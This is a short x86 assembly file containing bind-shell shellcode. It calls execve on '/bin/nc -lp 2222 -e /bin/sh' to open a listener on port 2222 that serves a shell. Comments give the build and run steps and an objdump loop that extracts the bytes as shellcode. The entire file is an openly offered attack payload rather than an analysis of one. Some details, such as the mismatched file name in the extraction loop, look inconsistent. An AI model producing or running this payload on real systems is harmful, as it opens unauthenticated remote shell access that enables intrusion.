section .code exec write

global _start

_start:

xor edx,edx ; NULL

; push strings onto the stack "/bin/nc -lp 2222 -e /bin/sh"
;hs/nib/ e- 2222 pl- cn/nib/
;68 73 2f 6e 69 62 2f 20 65 2d 20 32 32 32 32 20 70 6c 2d 20 63 6e 2f 6e 69 62 2f
;complie and run
;nasm -f elf simple_bind.asm
;ld -o simple_bind simple_bind.o
;./simple_bind
;objdump -d ./simple_bind
;for i in `objdump -d bind | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done

push edx
push byte 0x68 ; h
push word 0x732f ; /s
push 0x6e69622f ; /bin
mov eax,esp ; move pointer to "/bin/sh" to EAX

push edx
push word 0x652d ; -e
mov ecx,esp ; move pointer to "-e" to ECX

push edx
push 0x32323232 ; 2222
mov esi,esp ; move pointer to "2222" to ESI

push edx
push byte 0x70 ; p
push word 0x6c2d ; -l
mov edi,esp ; move pointer to "-lp" to EDI

push edx
push byte 0x63 ; c
push word 0x6e2f ; /n
push 0x6e69622f ; /bin
mov ebx,esp ; move pointer to "/bin/nc" to EBX

push edx ; NULL
push eax ; pointer to /bin/sh
push ecx ; pointer to -e
push esi ; pointer to 2222
push edi ; pointer to -lp
push ebx ; pointer to /bin/nc

mov ecx,esp ; pointer to args
xor eax,eax
mov byte al,0x0b ; int code for execve
int 0x80
